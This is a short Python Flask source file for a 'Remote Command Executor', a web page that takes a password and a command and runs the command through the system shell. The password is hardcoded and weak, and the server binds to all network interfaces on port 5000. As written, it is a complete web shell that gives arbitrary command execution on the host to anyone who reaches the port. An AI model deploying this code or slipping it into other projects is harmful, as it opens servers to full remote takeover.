from flask import Flask, request, render_template_string
import subprocess

app = Flask(__name__)

PASSWORD = "P@S5worD"

HTML_TEMPLATE = '''
    <h2>Remote Command Executor</h2>
    <form method="POST">
        Password: <input type="password" name="password"><br><br>
        Command: <input name="command" type="text" style="width: 400px;" autofocus>
        <input type="submit" value="Run">
    </form>
    <pre>{{output}}</pre>
'''

@app.route('/', methods=['GET', 'POST'])
def index():
    output = ""
    if request.method == 'POST':
        password = request.form.get('password', '')
        if password != PASSWORD:
            output = "Wrong password!"
        else:
            cmd = request.form.get('command', '')
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
            except subprocess.CalledProcessError as e:
                output = e.output
    return render_template_string(HTML_TEMPLATE, output=output)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)